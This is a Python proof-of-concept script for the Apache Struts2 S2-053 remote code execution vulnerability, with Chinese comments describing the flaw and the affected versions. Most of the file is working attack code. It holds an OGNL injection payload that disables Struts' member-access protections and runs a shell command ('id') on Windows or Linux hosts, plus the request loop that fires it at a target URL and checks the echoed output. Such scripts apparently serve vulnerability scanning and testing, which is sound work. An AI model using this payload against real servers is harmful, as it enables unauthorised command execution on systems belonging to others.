#!/usr/bin/env python		
# coding:utf-8

"""
S2-053 远程代码执行漏洞

Desc
	Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。
	导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，
	被OGNL解析第二次，导致任意命令执行漏洞。
Version
    Struts 2.0.1 - Struts 2.3.33
    Struts 2.5 - Struts 2.5.10
Type
    有回显漏洞
Usage
    - 需要指定payload传入的post参数，默认为redirect, 较难检测和利用
Referer
 - http://struts.apache.org/docs/s2-053.html
 - https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483663&idx=1&sn=6304e1469f23c33728ab5c73692b675e
"""
import requests
import logging
from six.moves.urllib import parse


def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/')

    command = "echo rivirsirfortest"
    payloads = [
        "${23333*23333}",
        # 命令执行payload
        "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
    ]
    for payload in payloads:
        # POST请求发送数据; 默认参数为:username,password
        try:
            data = {
                "username": "test",
                "redirectUri": payload
            }
            resp = requests.post(url, data=data, timeout=10)
            if "544428889" in resp.text:
                return True
            if "rivirsirfortest" in resp.text:
                return True
        except Exception as e:
            logging.debug(e)
    return False


if __name__ == '__main__':
    print poc("http://vuln.com:8080/hello.action")
